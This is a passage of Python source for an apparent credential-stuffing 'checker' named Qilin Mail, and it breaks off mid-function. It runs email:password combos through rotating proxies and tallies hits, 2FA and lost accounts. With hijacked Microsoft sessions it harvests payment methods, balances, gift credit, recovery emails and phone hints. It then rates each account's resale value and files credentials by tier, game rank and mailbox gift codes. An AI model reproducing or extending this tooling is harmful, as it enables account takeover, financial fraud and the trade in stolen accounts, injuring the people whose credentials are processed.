import concurrent.futures
import configparser
import json
import imaplib
import ssl
import os
import shutil
import random
import re
import socket
import string
import sys
import threading
import time
import traceback
import uuid
import warnings
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import readchar
import requests
import socks
import urllib3
from colorama import Fore, Style, init as colorama_init
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

colorama_init(autoreset=False, strip=False)

# ── GLOBAL COMBO TIMEOUT GUARD ─────────────────────────────────────────────
import signal as _signal

def _timeout_handler(signum, frame):
    raise TimeoutError("combo_timeout")

def with_timeout(secs, fn, *args, **kwargs):
    """Run fn(*args) with a hard wall-clock timeout (Unix only)."""
    try:
        if hasattr(_signal, 'SIGALRM'):
            old = _signal.signal(_signal.SIGALRM, _timeout_handler)
            _signal.alarm(secs)
            try:
                return fn(*args, **kwargs)
            finally:
                _signal.alarm(0)
                _signal.signal(_signal.SIGALRM, old)
        else:
            return fn(*args, **kwargs)
    except TimeoutError:
        return None
    except Exception:
        return None


def _safe_t(default=7):
    """Return (connect_timeout, read_timeout) tuple."""
    try:
        val = min(int(config.get('timeout', default)), 8)
    except:
        val = default
    return (min(val, 4), min(val, 8))


file_lock = threading.Lock()
proxy_lock = threading.Lock()

def write_dedupe(fname, filename, content):
    with file_lock:
        path = f'results/{fname}/{filename}'
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    if content.strip() in f.read():
                        return
            except: pass
        with open(path, 'a', encoding='utf-8', buffering=1) as f:
            f.write(content)

def get_optimized_timeout(config=None):
    if config and config.get('optimize_network', True):
        return (3, 5)
    else:
        return config.get('timeout', 8) if config else 10
if sys.platform == 'win32':
    try:
        os.system('chcp 65001 >nul 2>&1')
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
        else:
            import codecs
            sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, errors='replace')
            sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, errors='replace')
    except Exception:
        pass
class SimpleUtils:
    _title_cache = ''
    @staticmethod
    def set_title(title):
        if title == SimpleUtils._title_cache:
            return
        SimpleUtils._title_cache = title
        if sys.platform == 'win32':
            try:
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW(title)
            except Exception:
                pass
        else:
            try:
                sys.stdout.write(f'\x1b]0;{title}\x07')
                sys.stdout.flush()
            except Exception:
                pass
utils = SimpleUtils()
_FORMAT_THRESHOLDS = [(1000000000.0, 'B', 2), (1000000.0, 'M', 2), (1000.0, 'K', 1)]
def format_number(num):
    if not isinstance(num, (int, float)):
        try:
            num = float(num)
        except (ValueError, TypeError):
            return '0'
    num = float(num)
    if num < 0:
        return '0'
    for threshold, suffix, precision in _FORMAT_THRESHOLDS:
        if num >= threshold:
            return f'{num / threshold:.{precision}f}{suffix}'
    return str(int(num))
_DECORATIVE_SYMBOLS_RE = re.compile('[✪✿✦⚚➎★☆◆◇■□●○◎☀☁☂☃☄☾☽♛♕♚♔♤♡♢♧♠♥♦♣⚜⚡✨❖⬥⬦⬧⬨⬩⭐🌟🟊]+')
def clean_name(name):
    if not name:
        return ''
    return _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
def fetch_meowapi_stats(username, uuid=None):
    global config
    def format_coins(num):
        if not isinstance(num, (int, float)):
            return '0'
        num = float(num)
        abs_num = abs(num)
        if abs_num >= 1000000000000000.0:
            return f'{num / 1000000000000000.0:.1f}Q'
        if abs_num >= 1000000000000.0:
            return f'{num / 1000000000000.0:.1f}T'
        if abs_num >= 1000000000.0:
            return f'{num / 1000000000.0:.1f}B'
        if abs_num >= 1000000.0:
            return f'{num / 1000000.0:.1f}M'
        if abs_num >= 1000.0:
            return f'{num / 1000.0:.0f}K'
        return str(int(num))
    def get_skill_average(member):
        skills = member.get('skills', {})
        total_level = 0
        skill_count = 0
        skill_names = ['alchemy', 'carpentry', 'combat', 'enchanting', 'farming', 'fishing', 'foraging', 'mining', 'taming']
        for name in skill_names:
            skill_data = skills.get(name)
            if skill_data and 'levelWithProgress' in skill_data:
                total_level += skill_data['levelWithProgress']
                skill_count += 1
        return total_level / skill_count if skill_count > 0 else 0
    def clean_name_js(name):
        if not name:
            return ''
        cleaned = _DECORATIVE_SYMBOLS_RE.sub('', str(name)).strip()
        cleaned = re.sub('apis', '', cleaned, flags=re.IGNORECASE).strip()
        return cleaned
    try:
        timeout_val = int(config.get('timeout', 10))
        player_url = f'https://api.soopy.dev/player/{username}'
        p_data = None
        s_data = None
        if uuid:
            clean_uuid = uuid.replace('-', '')
            skyblock_url = f'https://soopy.dev/api/v2/player_skyblock/{clean_uuid}?networth=true'
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                f1 = executor.submit(requests.get, player_url, timeout=timeout_val)
                f2 = executor.submit(requests.get, skyblock_url, timeout=timeout_val)
                try:
                    resp1 = f1.result()
                    if resp1.status_code == 200:
                        p_data = resp1.json()
                except:
                    pass
                try:
                    resp2 = f2.result()
                    if resp2.status_code == 200:
                        s_data = resp2.json()
                except:
                    pass
        else:
            pjson = requests.get(player_url, timeout=timeout_val).json()
            if pjson.get('success') and 'data' in pjson:
                p_data = pjson
                fetched_uuid = pjson['data'].get('uuid', '').replace('-', '')
                if fetched_uuid:
                    skyblock_url = f'https://soopy.dev/api/v2/player_skyblock/{fetched_uuid}?networth=true'
                    s = requests.get(skyblock_url, timeout=timeout_val).json()
                    s_data = s
        if not p_data or not p_data.get('success') or 'data' not in p_data:
            return None
        data = p_data['data']
        final_uuid = uuid.replace('-', '') if uuid else data.get('uuid', '').replace('-', '')
        ach = data.get('achievements', {})
        skywars_stars = ach.get('skywars_you_re_a_star', 0)
        arcade_coins = ach.get('arcade_arcade_banker', 0)
        bedwars_stars = ach.get('bedwars_level', 0)
        uhc_bounty = ach.get('uhc_bounty', 0)
        pit_gold = ach.get('pit_gold', 0)
        s = s_data if s_data else {}
        best_member = None
        max_score = -1
        profiles_data = s.get('data', {}).get('profiles', {})
        for profile_id, profile in profiles_data.items():
            members = profile.get('members', {})
            member = members.get(uuid)
            if member:
                nw_detailed = member.get('nwDetailed', {})
                networth = nw_detailed.get('networth', 0) if nw_detailed else 0
                skill_avg = get_skill_average(member)
                sb_lvl = member.get('skyblock_level', 0)
                score = networth / 1000000 * 100 + skill_avg * 100 + sb_lvl * 10
                if score > max_score:
                    max_score = score
                    best_member = member
        coins = kills = fairy = networth = sb_lvl = 0
        avg_skill_level = 0.0
        item_list_str = ''
        if best_member:
            coins = best_member.get('coin_purse', 0)
            kills = best_member.get('kills', {}).get('total', 0)
            fairy = best_member.get('fairy_souls_collected', 0)
            sb_lvl = best_member.get('skyblock_level', 0)
            nw_detailed = best_member.get('nwDetailed', {})
            networth = nw_detailed.get('networth', 0) if nw_detailed else 0
            types = nw_detailed.get('types', {}) if nw_detailed else {}
            if networth == 0 and coins > 0:
                networth = coins
            avg_skill_level = get_skill_average(best_member)
            def collect_items(category_data):
                items_list = []
                if category_data and category_data.get('items'):
                    for i in category_data['items']:
                        clean = clean_name_js(i.get('name'))
                        if clean:
                            items_list.append(clean)
                return items_list
            all_valid_items = []
            for cat in ['armor', 'equipment', 'wardrobe', 'weapons', 'inventory']:
                all_valid_items.extend(collect_items(types.get(cat)))
            MAX_SHOWN_ITEMS = 5
            if len(all_valid_items) > MAX_SHOWN_ITEMS:
                shown_items = ', '.join(all_valid_items[:MAX_SHOWN_ITEMS])
                remaining = len(all_valid_items) - MAX_SHOWN_ITEMS
                item_list_str = f'{shown_items}, +{remaining} more'
            else:
                item_list_str = ', '.join(all_valid_items)
        parts = []
        if networth > 0:
            parts.append(f'NW: {format_coins(networth)}')
        if coins > 0:
            parts.append(f'Purse: {format_coins(coins)}')
        if avg_skill_level > 0:
            parts.append(f'Avg_Skill: {avg_skill_level:.2f}')
        if skywars_stars > 0:
            parts.append(f'SW: {skywars_stars}')
        if bedwars_stars > 0:
            parts.append(f'BW: {bedwars_stars}')
        if pit_gold > 0:
            parts.append(f'Pit_Gold: {format_coins(pit_gold)}')
        if uhc_bounty > 0:
            parts.append(f'UHC_Bounty: {format_coins(uhc_bounty)}')
        if sb_lvl > 0:
            parts.append(f'Sb_Lvl: {sb_lvl}')
        if arcade_coins > 0:
            parts.append(f'Arcade_Coins: {format_coins(arcade_coins)}')
        if kills > 0:
            parts.append(f'Sb_Kills: {kills}')
        if fairy > 0:
            parts.append(f'Sb_Fairy_Souls: {fairy}')
        if item_list_str:
            parts.append(f'Sb_Valuable_Items: {item_list_str}')
        return ' '.join(parts) if parts else None
    except Exception:
        return None

def ensure_results_dirs(fname):
    base = f'results/{fname}'
    for sub in ['', '/Tiers', '/Hypixel', '/Microsoft', '/Extra']:
        os.makedirs(base + sub, exist_ok=True)

def detect_og_name(name):
    if not name or name == 'N/A': return None
    n = str(name).strip()
    if len(n) <= 3 and n.isalpha():  return f'OG-3L ({n})'
    if len(n) == 4 and n.isalpha():  return f'OG-4L ({n})'
    if len(n) == 5 and n.isalpha():  return f'OG-5L ({n})'
    if re.match(r'^[A-Za-z][A-Za-z0-9]{1,5}$', n) and len(n) <= 6: return f'Semi-OG ({n})'
    return None

def fetch_cubecraft_stats(username):
    """CubeCraft istatistikleri - çoklu endpoint ile."""
    _cc_urls = [
        f'https://stats.cubecraft.net/api/player/{username}',
        f'https://api.cubecraft.net/v2/players/{username}',
        f'https://api.playcubecraft.net/v1/player/{username}',
    ]
    for url in _cc_urls:
        try:
            r = requests.get(url,
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                timeout=_safe_t(8), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            if not d: continue
            parts = []
            # Rank
            rank = d.get('rank') or d.get('player_rank') or ''
            if rank and str(rank).lower() not in ('member', '', 'none', 'default'):
                parts.append(f'Rank:{rank}')
            # Level/XP
            lvl = d.get('level') or d.get('experience_level')
            if lvl: parts.append(f'Lvl:{lvl}')
            # Games
            games = d.get('games') or d.get('stats') or {}
            _game_map = {
                'EggWars': 'EW', 'SkyWars': 'SW', 'Lucky Islands': 'LI',
                'Tower Defence': 'TD', 'BlockWars': 'BW',
                'eggwars': 'EW', 'skywars': 'SW',
            }
            for gname, short in _game_map.items():
                gd = games.get(gname) or {}
                k = gd.get('kills', 0) or gd.get('kills_count', 0)
                w = gd.get('wins', 0) or gd.get('wins_count', 0)
                if int(k) > 0 or int(w) > 0:
                    parts.append(f'{short}:{k}K/{w}W')
            return ' | '.join(parts) if parts else 'Registered'
        except: continue
    return None


def fetch_lunar_stats(uuid):
    """Lunar Client istatistikleri - çoklu endpoint."""
    if not uuid or uuid == 'N/A': return None
    try:
        c = str(uuid).replace('-', '')
        if len(c) < 32: return None
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
    except: return None
    _lunar_urls = [
        f'https://api.lunarclientprod.com/player/profile/{fmt}',
        f'https://api.lunarclient.net/player/{fmt}',
        f'https://api.lunardev.me/profile/{fmt}',
    ]
    for url in _lunar_urls:
        try:
            r = requests.get(url,
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                timeout=_safe_t(7), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            if not d: continue
            parts = []
            # Premium
            if d.get('premium') or d.get('isPremium'): parts.append('Premium')
            # Cosmetics
            cosm = d.get('cosmetics') or d.get('equippedCosmetics') or []
            if cosm: parts.append(f'Cosmetics:{len(cosm)}')
            # Cloak
            if d.get('active', {}).get('CLOAK') or d.get('cloak'): parts.append('Cloak')
            # Emote
            if d.get('active', {}).get('EMOTE') or d.get('emotes'): parts.append('Emote')
            # Color
            if d.get('active', {}).get('COLOR') or d.get('plus_color'): parts.append('Color+')
            # Partners (if influencer)
            if d.get('partner') or d.get('isPartner'): parts.append('⭐Partner')
            # Staff
            if d.get('staff') or d.get('isStaff'): parts.append('Staff')
            return ' | '.join(parts) if parts else 'Registered'
        except: continue
    return None


def calculate_value_score(cap):
    score = 0
    t = str(getattr(cap, 'type', '') or '').upper()
    if 'ULTIMATE' in t or 'XGPU' in t: score += 800
    elif 'GAME PASS' in t or 'XGP' in t: score += 400
    # ── Yeni skor katkıları
    try:
        if getattr(cap,'guild_info',None): score += 5
        if getattr(cap,'namemc_favs',None):
            try: score += min(int(str(cap.namemc_favs).replace(',',''))//10, 30)
            except: score += 5
        if getattr(cap,'bedrock_info',None): score += 10
        if getattr(cap,'paypal_bal',None): score += 20
        if getattr(cap,'cc_types',None): score += 15*min(len(cap.cc_types),3)
        if getattr(cap,'active_subs',None): score += 10
        if getattr(cap,'order_history',None): score += 5
        if getattr(cap,'sw_prestige',None): score += 10
        if getattr(cap,'capes_dev',None): score += 15
        if getattr(cap,'labymod_info',None) and 'Premium' in str(getattr(cap,'labymod_info','')): score += 20
        if getattr(cap,'badlion_info',None) and 'Cape' in str(getattr(cap,'badlion_info','')): score += 15
        if getattr(cap,'tlauncher_cape',None): score += 10
        if getattr(cap,'wynncraft_info',None): score += 8
        if getattr(cap,'slothpixel_info',None): score += 5
        if getattr(cap,'github_info',None): score += 5
        if getattr(cap,'cosmetica_info',None) and 'Cape' in str(getattr(cap,'cosmetica_info','')): score += 12
        if getattr(cap,'essential_info',None) and 'Essential+' in str(getattr(cap,'essential_info','')): score += 18
        if getattr(cap,'quasar_cape',None): score += 15
        if getattr(cap,'feather_info',None) and 'Cape' in str(getattr(cap,'feather_info','')): score += 10
        if getattr(cap,'realms_info',None): score += 8
        _nr = str(getattr(cap,'name_rarity','') or '')
        if 'Ultra Rare' in _nr: score += 80
        elif 'Very Rare' in _nr: score += 50
        elif 'Rare' in _nr: score += 25
        _snv = str(getattr(cap,'short_name_value','') or '')
        if '$500+' in _snv: score += 100
        elif '$200' in _snv: score += 70
        elif '$50' in _snv: score += 40
        elif '$20' in _snv: score += 20
        if getattr(cap,'zeqa_info',None): score += 7
        if getattr(cap,'breach_info',None): score += 3
        if getattr(cap,'minemen_info',None): score += 8
        _ir = getattr(cap,'imap_results',None)
        if _ir:
            if _ir.get('steam_codes'): score += 25
            if _ir.get('gift_codes'):  score += 15
            if _ir.get('keywords_found'): score += 5
    except: pass
    try:
        bal = getattr(cap, 'ms_balance', None)
        if bal:
            amt = float(re.sub(r'[^\d.]', '', str(bal)))
            score += min(int(amt * 20), 600)
    except: pass
    pms = getattr(cap, 'ms_payment_methods', [])
    if pms: score += len(pms) * 150
    try: score += min(int(getattr(cap, 'bwstars', 0) or 0), 300)
    except: pass
    nw = str(getattr(cap, 'sbnetworth', '') or '')
    if 'B' in nw: score += 400
    elif 'M' in nw: score += 200
    elif 'K' in nw: score += 50
    rank = str(getattr(cap, 'hypixl', '') or '').upper()
    if 'MVP++' in rank or 'YOUTUBE' in rank: score += 200
    elif 'MVP+' in rank: score += 100
    elif 'MVP' in rank:  score += 60
    elif 'VIP+' in rank: score += 40
    elif 'VIP' in rank:  score += 20
    if getattr(cap, 'banned', None) == 'False': score += 50
    if getattr(cap, 'access', None) == 'True':  score += 80
    if getattr(cap, 'ms_recovery_email', None): score += 30
    if getattr(cap, 'capes', None) and cap.capes not in ('', None): score += 60
    if getattr(cap, 'cape', None) == 'Yes': score += 30
    if getattr(cap, 'cubecraft_stats', None): score += 40
    if getattr(cap, 'lunar_stats', None) and 'Premium' in str(cap.lunar_stats): score += 50
    og = str(getattr(cap, 'og_name', '') or '')
    if 'OG-3L' in og: score += 500
    elif 'OG-4L' in og: score += 200
    elif 'OG-5L' in og: score += 80
    elif 'Semi' in og: score += 40
    return min(score, 9999)

def get_value_tier(score):
    if score >= 800: return 'S'
    if score >= 400: return 'A'
    if score >= 150: return 'B'
    return 'C'

def smart_save(fname, cap, line):
    t = str(getattr(cap, 'type', '') or '').upper()
    tier = getattr(cap, 'value_tier', 'C')
    bal = getattr(cap, 'ms_balance', None)
    has_balance = bal and str(bal) not in ('0.00 USD', '0 USD', 'None', '', 'None USD')
    has_cc = any('CC:' in str(pm) for pm in getattr(cap, 'ms_payment_methods', []))
    if ('ULTIMATE' in t or 'XGPU' in t) and (has_balance or has_cc):
        write_dedupe(fname, 'Tiers/S_XGPU_Premium.txt', line)
    elif 'ULTIMATE' in t or 'XGPU' in t:
        write_dedupe(fname, 'Tiers/A_XGPU.txt', line)
    elif 'GAME PASS' in t or 'XGP' in t:
        write_dedupe(fname, 'Tiers/A_XGP.txt', line)
    elif tier == 'S': write_dedupe(fname, 'Tiers/S_HighValue.txt', line)
    elif tier == 'A': write_dedupe(fname, 'Tiers/A_Good.txt', line)
    elif tier == 'B': write_dedupe(fname, 'Tiers/B_Normal.txt', line)
    else: write_dedupe(fname, 'Tiers/C_Basic.txt', line)
    _hyp_info = getattr(cap, 'slothpixel_info', None) or getattr(cap, 'hypixel_guild', None)
    try: _bw_stars = int(getattr(cap, 'bwstars', 0) or 0)
    except: _bw_stars = 0
    _hyp_str = str(_hyp_info or '')
    if _hyp_info and _hyp_str.strip() not in ('', 'N/A', 'None'):
        write_dedupe(fname, 'Hypixel/Ranked.txt', line)
        write_dedupe(fname, 'Hypixel/Hypixel_All.txt',
            f'{cap.email}:{cap.password} | {_hyp_str}\n')
        if 'BW' in _hyp_str:
            write_dedupe(fname, 'Hypixel/BedWars.txt',
                f'{cap.email}:{cap.password} | {_hyp_str}\n')
        if 'SW' in _hyp_str:
            write_dedupe(fname, 'Hypixel/SkyWars.txt',
                f'{cap.email}:{cap.password} | {_hyp_str}\n')
        if 'Cata' in _hyp_str or 'Dungeon' in _hyp_str:
            write_dedupe(fname, 'Hypixel/Dungeons.txt',
                f'{cap.email}:{cap.password} | {_hyp_str}\n')
        if any(r in _hyp_str for r in ('MVP++','MVP+','VIP+','YOUTUBE','ADMIN')):
            write_dedupe(fname, 'Hypixel/Premium_Rank.txt',
                f'{cap.email}:{cap.password} | {_hyp_str}\n')
    if _bw_stars >= 1000: write_dedupe(fname, 'Hypixel/BW_1000Plus.txt', line)
    elif _bw_stars >= 500: write_dedupe(fname, 'Hypixel/BW_500Plus.txt', line)
    elif _bw_stars >= 100: write_dedupe(fname, 'Hypixel/BW_100Plus.txt', line)
    elif _bw_stars >= 1:   write_dedupe(fname, 'Hypixel/BW_Has.txt', line)
    if getattr(cap, 'dungeons_level', None):
        write_dedupe(fname, 'Hypixel/Dungeons.txt', line)
    # ── Microsoft klasörü ─────────────────────────────────────
    _ms_t = str(getattr(cap, 'type', '') or '').upper()
    write_dedupe(fname, 'Microsoft/All_Accounts.txt', line)
    if 'ULTIMATE' in _ms_t or 'XGPU' in _ms_t:
        write_dedupe(fname, 'Microsoft/XGPU.txt', line)
    elif 'GAME PASS' in _ms_t or 'XGP' in _ms_t:
        write_dedupe(fname, 'Microsoft/XGP.txt', line)
    elif 'NORMAL' in _ms_t:
        write_dedupe(fname, 'Microsoft/Normal_Minecraft.txt', line)
    if has_balance:
        write_dedupe(fname, 'Microsoft/Balance.txt',
            f'{cap.email}:{cap.password} | Balance: {cap.ms_balance}\n')
    pms = getattr(cap, 'ms_payment_methods', [])
    if pms:
        write_dedupe(fname, 'Microsoft/Payment_Methods.txt',
            f'{cap.email}:{cap.password} | {", ".join(str(x) for x in pms)}\n')
    if getattr(cap, 'ms_rewards', None):
        write_dedupe(fname, 'Microsoft/Rewards_Points.txt',
            f'{cap.email}:{cap.password} | Points: {cap.ms_rewards}\n')
    if getattr(cap, 'ms_country', None):
        write_dedupe(fname, 'Microsoft/By_Country.txt',
            f'{cap.email}:{cap.password} | Country: {cap.ms_country}\n')
    if getattr(cap, 'og_name', None):
        write_dedupe(fname, 'Extra/OG_Names.txt',
            f'{cap.email}:{cap.password} | {cap.og_name}\n')
    if getattr(cap, 'cubecraft_stats', None):
        write_dedupe(fname, 'Extra/CubeCraft.txt',
            f'{cap.email}:{cap.password} | {cap.cubecraft_stats}\n')
    if getattr(cap, 'lunar_stats', None):
        write_dedupe(fname, 'Extra/Lunar.txt',
            f'{cap.email}:{cap.password} | {cap.lunar_stats}\n')
    if getattr(cap, 'ms_recovery_email', None):
        write_dedupe(fname, 'Extra/Recovery_Email.txt',
            f'{cap.email}:{cap.password} | Recovery: {cap.ms_recovery_email}\n')
    if getattr(cap, 'ms_phone_hint', None):
        write_dedupe(fname, 'Extra/Phone_Hints.txt',
            f'{cap.email}:{cap.password} | Phone: {cap.ms_phone_hint}\n')


# ── CAPE VALUE MAP ───────────────────────────────────────────────
CAPE_VALUES = {
    'minecon 2011': 'Legendary', 'minecon 2012': 'Legendary',
    'minecon 2013': 'Very Rare', 'minecon 2015': 'Very Rare',
    'minecon 2016': 'Rare',      'minecon earth': 'Common',
    'birthday': 'High',          '15th anniversary': 'High',
    'vanilla': 'Medium',         'migrator': 'Low',
    'cherry blossom': 'Medium',  'subscriber': 'Medium',
    'realms mapmaker': 'Rare',   'translator': 'Rare',
    'moderator': 'Rare',         'mojang office': 'Legendary',
    'optifine': 'Common',
}

def get_cape_value(cape_str):
    if not cape_str: return None
    cs = str(cape_str).lower()
    for name, val in CAPE_VALUES.items():
        if name in cs:
            return f'{name.title()} ({val})'
    return None

def fetch_namemc_skin(username, uuid):
    try:
        if not uuid or uuid == 'N/A': return None
        import base64 as _b64
        r = requests.get(
            f'https://sessionserver.mojang.com/session/minecraft/profile/{str(uuid).replace("-","")}',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=6, verify=False)
        if r.status_code == 200:
            for prop in r.json().get('properties', []):
                if prop.get('name') == 'textures':
                    decoded = _b64.b64decode(prop['value']).decode('utf-8', errors='ignore')
                    if '"SKIN"' in decoded:
                        slim = 'slim' in decoded.lower()
                        return f'Custom|{"Slim" if slim else "Classic"}'
                    return 'Default'
    except: pass
    return None

def fetch_uuid_backup(username):
    for url in [
        f'https://api.minetools.eu/uuid/{username}',
        f'https://playerdb.co/api/player/minecraft/{username}',
    ]:
        try:
            r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=6, verify=False)
            if r.status_code == 200:
                d = r.json()
                uid = d.get('id') or d.get('data', {}).get('player', {}).get('id')
                if uid: return uid
        except: continue
    return None

def fetch_account_age(session):
    try:
        r = session.get('https://account.microsoft.com/profile',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        for pat in [r'"createdDateTime"\s*:\s*"([^"]+)"',
                    r'"created"\s*:\s*"([^"]+)"']:
            m = re.search(pat, r.text, re.I)
            if m:
                raw = m.group(1)[:10]
                try:
                    from datetime import datetime as _dt
                    dt = _dt.strptime(raw, '%Y-%m-%d')
                    age = (_dt.utcnow() - dt).days
                    if age < 365: return f'{age}d'
                    return f'{age//365}y {(age%365)//30}m'
                except: return raw
    except: pass
    return None

def detect_2fa_type(session):
    try:
        r = session.get('https://account.live.com/proofs/List',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        txt = r.text.lower(); types = []
        if 'authenticator' in txt or 'totp' in txt: types.append('Auth')
        if 'sms' in txt or ('phone' in txt and 'verify' in txt): types.append('SMS')
        if 'alternate email' in txt or 'recovery email' in txt: types.append('Email')
        if 'passkey' in txt: types.append('Passkey')
        return '+'.join(types) if types else None
    except: return None

def fetch_ms_country(session):
    try:
        for url in ['https://account.microsoft.com/billing/addresses',
                    'https://account.microsoft.com/profile']:
            r = session.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
            for pat in [r'"countryCode"\s*:\s*"([A-Z]{2})"',
                        r'"country"\s*:\s*"([A-Z]{2})"',
                        r'"billingCountry"\s*:\s*"([A-Z]{2})"']:
                m = re.search(pat, r.text)
                if m: return m.group(1).upper()
    except: pass
    return None

def fetch_sub_expiry(session):
    try:
        r = session.get('https://account.microsoft.com/services',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        for pat in [r'"expirationDate"\s*:\s*"([^"]{8,20})"',
                    r'"nextBillingDate"\s*:\s*"([^"]{8,20})"',
                    r'"endDate"\s*:\s*"([^"]{8,20})"']:
            m = re.search(pat, r.text)
            if m: return m.group(1)[:10]
    except: pass
    return None

def fetch_xbox_gamertag(session):
    try:
        r = session.get(
            'https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag',
            headers={'User-Agent': 'Mozilla/5.0', 'x-xbl-contract-version': '3'},
            timeout=10)
        if r.status_code == 200:
            m = re.search(r'"value"\s*:\s*"([^"]+)"', r.text)
            if m: return m.group(1)
        r2 = session.get('https://account.microsoft.com/profile',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        m2 = re.search(r'gamertag["\s:]+([^\s"<]{2,20})', r2.text, re.I)
        if m2: return m2.group(1)
    except: pass
    return None

def detect_alt_account(session):
    try:
        r = session.get('https://account.microsoft.com/family/home',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        if 'family' in r.url or 'familymember' in r.text.lower():
            if 'child' in r.text.lower(): return 'Child'
            if 'organizer' in r.text.lower(): return 'Organizer'
            return 'FamilyMember'
    except: pass
    return None

def fetch_gift_card_balance(session):
    try:
        r = session.get('https://account.microsoft.com/billing/redeem',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        for pat in [r'"balance"\s*:\s*"?(\d+\.?\d*)"?',
                    r'\$(\d+\.\d{2})\s*credit']:
            m = re.search(pat, r.text, re.I)
            if m and float(m.group(1)) > 0:
                return f'{m.group(1)} credits'
    except: pass
    return None

# ── PROXY HEALTH MONITOR ─────────────────────────────────────────
_dead_proxies = set()
_proxy_fail_counts = {}
_proxy_lock_local = threading.Lock()

def mark_proxy_dead(proxy):
    with _proxy_lock_local:
        _dead_proxies.add(proxy)
        try: proxylist.remove(proxy)
        except: pass

def report_proxy_fail(proxy):
    with _proxy_lock_local:
        _proxy_fail_counts[proxy] = _proxy_fail_counts.get(proxy, 0) + 1
        if _proxy_fail_counts[proxy] >= 3:
            mark_proxy_dead(proxy)

def get_healthy_proxy():
    with _proxy_lock_local:
        alive = [p for p in proxylist if p not in _dead_proxies]
        return random.choice(alive) if alive else None

def verify_proxy(proxy, timeout=5):
    try:
        r = requests.get('https://api.ipify.org',
            proxies={'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'},
            timeout=timeout, verify=False)
        return r.status_code == 200
    except: return False

def health_check_proxies_bg():
    while True:
        try:
            time.sleep(120)
            if not proxylist: continue
            sample = random.sample(list(proxylist), min(10, len(proxylist)))
            for px in sample:
                if not verify_proxy(px, timeout=4):
                    mark_proxy_dead(px)
        except: pass

def _start_proxy_health_monitor():
    if proxylist:
        threading.Thread(target=health_check_proxies_bg, daemon=True).start()

# ── COMBO SMART SKIP ─────────────────────────────────────────────
_checked_emails = set()
_checked_lock   = threading.Lock()

def is_already_checked(email):
    with _checked_lock:
        return email.lower() in _checked_emails

def mark_email_checked(email):
    with _checked_lock:
        _checked_emails.add(email.lower())

# ── SESSION REPORT ───────────────────────────────────────────────
def generate_session_report(fname, start_time_ts, stats_dict):
    try:
        elapsed = int(time.time() - start_time_ts) if start_time_ts else 0
        h, m, s = elapsed//3600, (elapsed%3600)//60, elapsed%60
        rows = [
            '=' * 58,
            '        SESSION REPORT — Qilin Mail',
            '=' * 58,
            f'  Date       : {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
            f'  Duration   : {h:02d}:{m:02d}:{s:02d}',
            '-' * 58,
            f'  Checked    : {stats_dict.get("checked",0)}',
            f'  Hits       : {stats_dict.get("hits",0)}',
            f'  Bad        : {stats_dict.get("bad",0)}',
            f'  2FA        : {stats_dict.get("twofa",0)}',
            f'  Lost       : {stats_dict.get("lost",0)}',
            f'  XGPU       : {stats_dict.get("xgpu",0)}',
            f'  XGP        : {stats_dict.get("xgp",0)}',
            f'  MFA/SFA    : {stats_dict.get("mfa",0)} / {stats_dict.get("sfa",0)}',
            f'  S-Tier     : {stats_dict.get("tier_s",0)}',
            f'  A-Tier     : {stats_dict.get("tier_a",0)}',
            f'  B-Tier     : {stats_dict.get("tier_b",0)}',
            f'  OG Names   : {stats_dict.get("og_names",0)}',
            f'  Capes      : {stats_dict.get("minecraft_capes",0)}',
            f'  Optifine   : {stats_dict.get("optifine_capes",0)}',
            f'  Payment    : {stats_dict.get("payment_methods",0)}',
            f'  Errors     : {stats_dict.get("errors",0)}',
            '-' * 58,
        ]
        chk = stats_dict.get('checked',1) or 1
        hits_v = stats_dict.get('hits',0)
        rows.append(f'  Hit Rate   : {hits_v/chk*100:.2f}%')
        cpm_v = stats_dict.get('cpm',0)
        if cpm_v: rows.append(f'  CPM        : {cpm_v}')
        rows.append('=' * 58)
        path = f'results/{fname}/Session_Report.txt'
        with open(path, 'w', encoding='utf-8') as f_r:
            f_r.write('\n'.join(rows) + '\n')
        with open('all_time_stats.txt', 'a', encoding='utf-8') as f_at:
            f_at.write(f'{datetime.now().strftime("%Y-%m-%d %H:%M")} | '                       f'Checked:{stats_dict.get("checked",0)} | '                       f'Hits:{hits_v} | XGPU:{stats_dict.get("xgpu",0)} | '                       f'S:{stats_dict.get("tier_s",0)} | '                       f'OG:{stats_dict.get("og_names",0)}\n')
        return path
    except: return None

def clean_duplicates_in_results(fname):
    base_p = f'results/{fname}'
    removed = 0
    for root, dirs, files in os.walk(base_p):
        for fn in files:
            if not fn.endswith('.txt'): continue
            fp = os.path.join(root, fn)
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f_c:
                    lns = f_c.readlines()
                seen = set(); unique = []
                for ln in lns:
                    k = ln.strip()
                    if k and k not in seen:
                        seen.add(k); unique.append(ln)
